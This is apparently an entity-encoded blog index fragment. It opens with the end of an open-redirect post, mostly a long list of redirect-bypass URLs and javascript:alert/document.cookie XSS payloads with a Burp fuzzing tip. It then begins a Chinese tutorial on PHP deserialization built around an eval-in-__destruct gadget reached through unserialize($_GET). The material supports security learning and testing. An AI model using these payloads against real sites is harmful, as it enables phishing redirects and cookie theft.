4C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;https://%5cwhitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/https://%5cwhitelisted.com@google.comhttps://%5cwhitelisted.com@google.comhttps://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77//https://google.com///https://google.com///https://google.com//https://google.com/https:google.comhttps://////google.comhttps://google.com//https://google.com/https://google.comhttps:/\\google.comhttps:google.com//https:///google.com/%2e%2e/https://google.com/%2e%2ehttps:///google.com/%2e%2e//https://google.com/%2e%2e%2fhttps://google.com/%2e%2e%2f/https://google.com/%2f..https://google.com/%2f../https:///google.com/%2f%2e%2e/https://google.com/%2f%2e%2ehttps:///google.com/%2f%2e%2ehttps://google.com/%2f%2e%2ehttps://:@google.com\\@whitelisted.comhttps://google.com?whitelisted.comhttps://google.com/whitelisted.comhttps://google.com\\whitelisted.comhttps://google.com#whitelisted.comhttps://google%E3%80%82com//https://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///https://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/https://:@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;\\@whitelisted.comhttps://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/whitelisted.comhttps://whitelisted.com;@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;https://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//https://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/https://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/https://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2ehttps:///whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e//https://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e%2fhttps://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e%2f/https://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f..https://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f../https:///whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2e/https://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2ehttps:///whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2ehttps://whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2e//https://whitelisted.com@google.com///https://whitelisted.com@google.com/https://whitelisted.com;@google.comhttps://whitelisted.com.google.comhttps://whitelisted.com@google.com//https://whitelisted.com@google.com/https://whitelisted.com@google.com/https://whitelisted.com@google.com/%2e%2ehttps:///whitelisted.com@google.com/%2e%2e//https://whitelisted.com@google.com/%2e%2e%2fhttps://whitelisted.com@google.com/%2e%2e%2f/https://whitelisted.com@google.com/%2f..https://whitelisted.com@google.com/%2f../https:///whitelisted.com@google.com/%2f%2e%2e/https://whitelisted.com@google.com/%2f%2e%2ehttps:///whitelisted.com@google.com/%2f%2e%2ehttps://whitelisted.com@google.com/%2f%2e%2e/https://whitelisted.com@google.com/%2f.//whitelisted.com@google.com/%2f..https://whitelisted.com/https://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/https://whitelisted.com/https://google.com/@https://www.google.comhttp://&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;\\twhitelisted.com/http://whitelisted.com@00330.00072.0000326.00000316http:whitelisted.com@00330.00072.0000326.00000316http://whitelisted.com@00330.0x3a.54990http:whitelisted.com@00330.0x3a.54990http://whitelisted.com@00330.3856078http:whitelisted.com@00330.3856078http://whitelisted.com@0330.072.0326.0316http:whitelisted.com@0330.072.0326.0316http://whitelisted.com@0xd8.072.54990http:whitelisted.com@0xd8.072.54990http://whitelisted.com@0xd8.0x3a.0xd6.0xcehttp:whitelisted.com@0xd8.0x3a.0xd6.0xcehttp://whitelisted.com@0xd8.3856078http:whitelisted.com@0xd8.3856078http://whitelisted.com@0xd83ad6cehttp:whitelisted.com@0xd83ad6cehttp://whitelisted.com@[::216.58.214.206]http:whitelisted.com@[::216.58.214.206]http://whitelisted.com%2e&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/http://whitelisted.com%2egoogle.com/http://whitelisted.com@3627734734http:whitelisted.com@3627734734http://whitelisted.com@472.314.470.462http:whitelisted.com@472.314.470.462http://whitelisted.com:80%40&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/http://whitelisted.com:80%40google.com/http://whitelisted.com@[::ffff:216.58.214.206]http:whitelisted.com@[::ffff:216.58.214.206]http://whitelisted.com@google.com/http://whitelisted.com+&amp;@google.com#+@whitelisted.com/http://whitelisted.com+&amp;@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;#+@whitelisted.com/http://www.google.com\\.whitelisted.comhttp://www.&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;\\.whitelisted.comhttp://XY&gt;.7d8T\\205pZM@00330.00072.0000326.00000316http:XY&gt;.7d8T\\205pZM@00330.00072.0000326.00000316http://XY&gt;.7d8T\\205pZM@00330.0x3a.54990http:XY&gt;.7d8T\\205pZM@00330.0x3a.54990http://XY&gt;.7d8T\\205pZM@00330.3856078http:XY&gt;.7d8T\\205pZM@00330.3856078http://XY&gt;.7d8T\\205pZM@0330.072.0326.0316http:XY&gt;.7d8T\\205pZM@0330.072.0326.0316http://XY&gt;.7d8T\\205pZM@0xd8.072.54990http:XY&gt;.7d8T\\205pZM@0xd8.072.54990http://XY&gt;.7d8T\\205pZM@0xd8.0x3a.0xd6.0xcehttp:XY&gt;.7d8T\\205pZM@0xd8.0x3a.0xd6.0xcehttp://XY&gt;.7d8T\\205pZM@0xd8.3856078http:XY&gt;.7d8T\\205pZM@0xd8.3856078http://XY&gt;.7d8T\\205pZM@0xd83ad6cehttp:XY&gt;.7d8T\\205pZM@0xd83ad6cehttp://XY&gt;.7d8T\\205pZM@[::216.58.214.206]http:XY&gt;.7d8T\\205pZM@[::216.58.214.206]http://XY&gt;.7d8T\\205pZM@3627734734http:XY&gt;.7d8T\\205pZM@3627734734http://XY&gt;.7d8T\\205pZM@472.314.470.462http:XY&gt;.7d8T\\205pZM@472.314.470.462http://XY&gt;.7d8T\\205pZM@[::ffff:216.58.214.206]http:XY&gt;.7d8T\\205pZM@[::ffff:216.58.214.206]http://XY&gt;.7d8T\\205pZM@whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/http://XY&gt;.7d8T\\205pZM@whitelisted.com+@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/http://XY&gt;.7d8T\\205pZM@whitelisted.com@google.com/http://XY&gt;.7d8T\\205pZM@whitelisted.com+@google.com/ja\\nva\\tscript\\r:alert(1)java%09script:alert(1)java%0ascript:alert(1)java%0d%0ascript%0d%0a:alert(0)java%0dscript:alert(1)Javas%26%2399;ript:alert(1)javascript://%0aalert(1)&lt;&gt;javascript:alert(1);//javascript:alert(1);//javascript:alert(1)/javascript:alert(1);/javascript:alert(1)\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)javascript:alert(1);javascript:alert(1)javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)javascript:confirm(1)javascript://https://whitelisted.com/?z=%0Aalert(1)javascript:prompt(1)jaVAscript://whitelisted.com//%0d%0aalert(1);//javascript://whitelisted.com?%a0alert%281%29//&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;\\twhitelisted.com/\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)////whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;//////whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;////whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/////whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/whitelisted.com//&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;\\@whitelisted.com//whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;////whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/whitelisted.comwhitelisted.com;@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;////whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e///whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e////whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e%2f///whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e%2f//whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e%2f////whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f..///whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f..//whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f..////whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2e///whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2e//whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2f%2e%2e/\\whitelisted.com:80%40google.comwhitelisted.com@%E2%80%AE@google.com////whitelisted.com@google.com//////whitelisted.com@google.com////whitelisted.com@google.com/////whitelisted.com@google.com///whitelisted.com@google.com////whitelisted.com@google.com/whitelisted.com;@google.comwhitelisted.com.google.com////whitelisted.com@google.com/%2e%2e///whitelisted.com@google.com/%2e%2e////whitelisted.com@google.com/%2e%2e%2f///whitelisted.com@google.com/%2e%2e%2f//whitelisted.com@google.com/%2e%2e%2f////whitelisted.com@google.com/%2f..///whitelisted.com@google.com/%2f..//whitelisted.com@google.com/%2f..////whitelisted.com@google.com/%2f%2e%2e///whitelisted.com@google.com/%2f%2e%2e//whitelisted.com@google.com/%2f%2e%2e//whitelisted.com+&amp;@google.com#+@whitelisted.com///whitelisted.com@https:///&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;/%2e%2e//whitelisted.com@https:///google.com/%2e%2e//whitelisted.com+&amp;@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;#+@whitelisted.com//x:1/:///%01javascript:alert(document.cookie)/\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)//XY&gt;.7d8T\\205pZM@whitelisted.com@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///XY&gt;.7d8T\\205pZM@whitelisted.com+@&#x24C1;&#x1D428;&#x1D5F0;&#xFFFD;&#x1D55D;&#x2146;&#x1D4F8;&#x24DC;&#x2090;&#x2139;&#x24C3;&#xFF61;&#xFF30;&#x24E6;///XY&gt;.7d8T\\205pZM@whitelisted.com@google.com///XY&gt;.7d8T\\205pZM@whitelisted.com+@google.com/ In the brupsuite, you can use /xxx?Parameter_Payload={URL_payload} to FUZZ. Reference: Open_redirect_part1 Open_redirect_part2 payload_github_url Open Redirect Cheat Sheet","link":"/2019/01/01/Open_Redirect/"},{"title":"PHP反序列化进阶学习与总结","text":"&#x8BF4;&#x5728;&#x524D;&#x9762;&#x5BF9;&#x4E8E;PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x539F;&#x6765;&#x4E5F;&#x5C31;&#x53EA;&#x662F;&#x6D45;&#x5C1D;&#x800C;&#x6B62;&#x3002;&#x6700;&#x8FD1;&#x770B;&#x5230;&#x5F88;&#x591A;&#x9898;&#x7684;&#x51FA;&#x73B0;&#x4E86;&#x591A;&#x79CD;&#x6CA1;&#x6709;&#x4E86;&#x89E3;&#x8FC7;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5F62;&#x5F0F;&#xFF0C;&#x5C31;&#x6B64;&#x8FDB;&#x4E00;&#x6B65;&#x5B66;&#x4E60;&#x4E00;&#x4E0B;&#x3002;&#x5176;&#x4E2D;&#x5F88;&#x591A;&#x5185;&#x5BB9;&#x90FD;&#x53C2;&#x8003;&#x4E86;&#x5E08;&#x5085;&#x4EEC;&#x7684;&#x535A;&#x5BA2;&#xFF0C;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#x7ECF;&#x8FC7;&#x81EA;&#x5DF1;&#x7684;&#x4FEE;&#x6539;&#x3002;&#x5982;&#x679C;&#x5B58;&#x5728;&#x9519;&#x8BEF;&#xFF0C;&#x8FD8;&#x671B;&#x5E08;&#x5085;&#x4EEC;&#x6307;&#x51FA;&#x3002; &#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x5148;&#x77E5;&#xFF1A;https://xz.aliyun.com/t/6454 pravite&#x548C;Protected&#x6210;&#x5458;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x4EE5;&#x524D;&#x5728;&#x505A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x9898;&#x7684;&#x65F6;&#x5019;&#x9047;&#x5230;&#x7684;&#x90FD;&#x662F;public&#x6210;&#x5458;&#xFF0C;&#x4F46;&#x5728;k0rz3n&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;&#x4E2D;&#x770B;&#x5230;&#x4E86;Private&#x548C;Protected&#x6743;&#x9650;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x6709;&#x7740;&#x4E0D;&#x540C;&#x7684;&#x5DEE;&#x522B;&#x3002;&#x8FD9;&#x91CC;&#x505A;&#x4E00;&#x4E2A;&#x5C0F;&#x77E5;&#x8BC6;&#x70B9;&#x7684;&#x603B;&#x7ED3;&#x3002; &#x5148;&#x6765;&#x590D;&#x4E60;&#x4E00;&#x4E0B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x4F8B;&#x5B50;&#xFF1A; 1234567891011121314151617&lt;?phpclass Threezh1 { public $text; function execute($payload) { eval($payload); } function __destruct(){ $this-&gt;execute($this-&gt;text); }}$a = new Threezh1();$a-&gt;text = &apos;echo &quot;Threezh1&quot;;&apos;;echo serialize($a);?&gt; &#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;&#x5185;&#x5BB9;&#xFF1A; O:8:&quot;Threezh1&quot;:1:{s:4:&quot;text&quot;;s:16:&quot;echo &quot;Threezh1&quot;;&quot;;} O&#x4EE3;&#x8868;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;8&#x4EE3;&#x8868;&#x5BF9;&#x8C61;&#x540D;&#x79F0;&#x7684;&#x957F;&#x5EA6;&#xFF0C;1&#x4EE3;&#x8868;&#x6210;&#x5458;&#x4E2A;&#x6570;&#x3002; &#x5927;&#x62EC;&#x53F7;&#x4E2D;&#x5206;&#x522B;&#x662F;&#xFF1A;&#x5C5E;&#x6027;&#x540D;&#x7C7B;&#x578B;&#x3001;&#x957F;&#x5EA6;&#x3001;&#x540D;&#x79F0;;&#x503C;&#x7C7B;&#x578B;&#x3001;&#x957F;&#x5EA6;&#x3001;&#x503C;&#x3002; &#x90A3;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A; 1234567891011121314&lt;?phpclass Threezh1 { public $text; function execute($payload) { eval($payload); } function __destruct(){ $this-&gt;execute($this-&gt;text); }}unserialize($_GET[&quot;a&quot;]);?&gt; &#x8BBF;&#x95EE;&#xFF1A;http://127.0.0.1/index.php?a=O:8:%22Threezh1%22:1:{s:4:%22text%22;s:16:%22echo%20%22Threezh1%22;%22;} &#x8FD4;&#x56DE;&#xFF1A; Threezh1 Private&#x7C7B;&#x578B;&#x90A3;&#x4E48;&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF0C;&#x5982;&#x679C;&#x628A;$text&#x6210;&#x5458;&#x4ECE;public&#x6539;&#x4E3A;private&#x5462;&#xFF1F; &#x56E0;&#x4E3A;&#x5728;&#x5B9E;&#x4F8B;&#x4E2D;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;$obj-&gt;&#x5C5E;&#x6027;&#x540D;(&#x6216;&#x65B9;&#x6CD5;&#x540D;) &#x6765;&#x8C03;&#x7528;pravite&#x7C7B;&#x578B;&#x7684;&#x65B9;&#x6CD5;&#x6216;&#x5C5E;&#x6027;&#x3002;&#x6240;&#x4EE5;&#x4E0A;&#x9762;&#x751F;&#x6210;&#x7684;&#x4F8B;&#x5B50;&#x9700;&#x8981;&#x6539;&#x4E00;&#x4E0B;&#xFF1A; 1234567891011121314151617181920212223&lt;?phpclass Threezh1{ private $text = &apos;phpinfo();&apos;; public function setPayload($temp){ $this-&gt;text = $temp; } function execute($payload) { eval($payload); } function __destruct(){ $this-&gt;execute($this-&gt;text); }}$a = new Threezh1();$a-&gt;setPayload(&apos;echo &quot;Threezh1&quot;;&apos;);$data = serialize($a);echo($data);file_put_contents(&quot;serialize.txt&quot;, $data); &#x8FD9;&#x65F6;&#x5019;&#x751F;&#x6210;&#x51FA;&#x6765;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A; O:8:&quot;Threezh1&quot;:1:{s:14:&quot;Threezh1text&quot;;s:16:&quot;echo &quot;Threezh1&quot;;&quot;;} &#x6309;&#x7167;&#x524D;&#x9762;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6B65;&#x9AA4;&#xFF0C;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;&#x4F1A;&#x53D1;&#x73B0;&#x5E8F;&#x5217;&#x5316;&#x5E76;&#x6CA1;&#x6709;&#x6210;&#x529F;&#xFF0C;&#x663E;&#x793A;&#x4E86;phpinfo&#x7684;&#x9875;&#x9762;&#xFF1A; &#x90A3;&#x600E;&#x4E48;&#x6837;&#x624D;&#x80FD;&#x4F7F;&#x5B83;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6210;&#x529F;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x4F7F;&#x7528;winhex&#x6253;&#x5F00;&#x521A;&#x521A;&#x4FDD;&#x5B58;&#x7684;serialize.txt&#x3002;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#x56FE;&#xFF1A; &#x4F1A;&#x53D1;&#x73B0;&#x5728;Threezh1&#x7684;&#x5DE6;&#x53F3;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5C5E;&#x6027;&#x540D;&#x4E2D;&#x7684;&#x7C7B;&#x540D;&#x5DE6;&#x53F3;&#x5B58;&#x5728;&#x4E24;&#x4E2A;&#x7A7A;&#x5B57;&#x8282;&#x3002;&#x6240;&#x4EE5;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E0D;&#x6210;&#x529F;&#x7684;&#x539F;&#x56E0;&#x5C31;&#x662F;&#x7531;&#x4E8E;&#x5E8F;&#x5217;&#x5316;&#x5185;&#x5BB9;&#x751F;&#x6210;&#x5230;&#x7F51;&#x9875;&#x540E;&#xFF0C;&#x7A7A;&#x5B57;&#x8282;&#x4E0D;&#x4F1A;&#x4E00;&#x540C;&#x751F;&#x6210;&#x51FA;&#x53BB;&#xFF0C;&#x5BFC;&#x81F4;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x662F;private&#x5C5E;&#x6027;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5931;&#x8D25;&#x3002; &#x90A3;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#xFF0C;&#x5728;&#x4F20;&#x9012;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#xFF0C;&#x5728;&#x7C7B;&#x540D;&#x7684;&#x5DE6;&#x53F3;&#x52A0;&#x4E0A;%00&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7A7A;&#x5B57;&#x8282;&#x5BF9;&#x4E8E;&#x7684;URL&#x7F16;&#x7801;&#x3002;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6210;&#x529F;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A; &#x8FD9;&#x4E5F;&#x6B63;&#x597D;&#x89E3;&#x91CA;&#x4E86;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x5E8F;&#x5217;&#x5316;&#x5185;&#x5BB9;&#x4E2D;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x5C5E;&#x6027;&#x540D;&#x7684;&#x957F;&#x5EA6;&#x4E3A;14&#x3002; &#x6240;&#x4EE5;&#xFF0C;Private&#x7C7B;&#x578B;&#x5728;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A;%00&#x7C7B;&#x540D;%00 Protected&#x7C7B;&#x578B;Protected&#x7C7B;&#x578B;&#x548C;private&#x6709;&#x4E9B;&#x8BB8;&#x4E0D;&#x540C;&#xFF0C;&#x751F;&#x6210;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x5185;&#x5BB9;&#x4E3A;&#xFF1A; O:8:&quot;Threezh1&quot;:1:{s:7:&quot;*text&quot;;s:16:&quot;echo &quot;Threezh1&quot;;&quot;;} &#x4F7F;&#x7528;winhex&#x67E5;&#x770B;&#x4FDD;&#x5B58;&#x7684;serialize.txt&#xFF1A; &#x53EF;&#x5F97;&#x51FA;&#xFF0C;Protected&#x7C7B;&#x578B;&#x5728;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A;%00*%00&#x7C7B;&#x540D; 